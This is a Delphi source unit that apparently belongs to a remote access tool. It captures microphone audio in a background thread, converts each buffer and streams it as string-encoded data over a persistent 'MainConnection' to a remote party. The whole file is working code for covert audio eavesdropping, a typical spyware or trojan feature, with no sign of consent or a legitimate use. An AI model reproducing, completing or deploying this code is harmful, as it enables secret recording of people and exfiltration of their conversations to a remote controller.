unit UnitMicrophone;

interface

uses
  Windows, ThreadUnit, ACMConvertor, ACMIn, UnitConstants, UnitVariables,
  MMSystem, UnitStringCompression, UnitFunctions, StreamUnit, UnitConnection;
                         
type
  TAudioThread = class(TThread)
  private
    Sample, Channel: Integer;
    procedure BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
  protected
    procedure Execute; override;
  public
    constructor Create(xSample, xChannel: Integer);
    procedure StopStreaming;
  end;

var
  AudioThread: TAudioThread;

implementation
            
var
  ACMC: TACMConvertor;
  ACMI: TACMIn;

constructor TAudioThread.Create(xSample, xChannel: Integer);
begin
  inherited Create(True);
  Sample := xSample;
  Channel := xChannel;
end;

procedure TAudioThread.Execute;
var
  Format: TWaveFormatEx;
begin
  Format.nChannels := Channel;
  Format.nSamplesPerSec := Sample;
  Format.wBitsPerSample := 16;
  Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
  Format.nBlockAlign := Format.nChannels * 2;

  ACMC := TACMConvertor.Create;
  ACMI := TACMIn.Create;

  ACMI.OnBufferFull := BufferFull;
  ACMC.FormatIn.Format.nChannels := Format.nChannels;
  ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
  ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
  ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
  ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
  ACMC.InputBufferSize := ACMC.FormatIn.Format.nAvgBytesPerSec;
  ACMI.BufferSize := ACMC.InputBufferSize;
  ACMC.Active := True;
  ACMI.Open(ACMC.FormatIn);

  while True do ProcessMessages;
end;

procedure TAudioThread.StopStreaming;
begin                  
  ACMI.Close;          
  ACMI.Free;
  ACMC.Active := False;
  ACMC.Free;
end;

procedure TAudioThread.BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
var
  Stream: TMemoryStream;
  TmpSize: Integer;
  TmpStr: string;
begin
  Move(Data^, ACMC.BufferIn^, Size);
  TmpSize := ACMC.Convert;
  Stream := TMemoryStream.Create;
  Stream.Size := TmpSize;
  Stream.WriteBuffer(ACMC.BufferOut^, TmpSize);
  Stream.Position := 0;
  TmpStr := StreamToStr(Stream);
  Stream.Free;
  if TmpStr <> '' then SendDatas(MainConnection, MICROPHONESTREAM + '|' + TmpStr);
end;

end.
